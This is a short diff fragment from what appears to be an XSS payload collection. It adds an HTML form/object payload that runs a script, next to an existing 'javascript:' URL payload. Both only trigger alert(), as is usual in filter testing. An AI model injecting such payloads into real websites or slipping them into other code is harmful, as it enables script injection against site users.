@@ -17,7 +17,7 @@ JavaScript://%250Aalert?.(1)//
 ```
 ###
 ```
-lol
+<form id=frm><object id=x form=frm></object></form><script>alert(document.getElementById('x').form);</script>
 ```
 ###
 ```
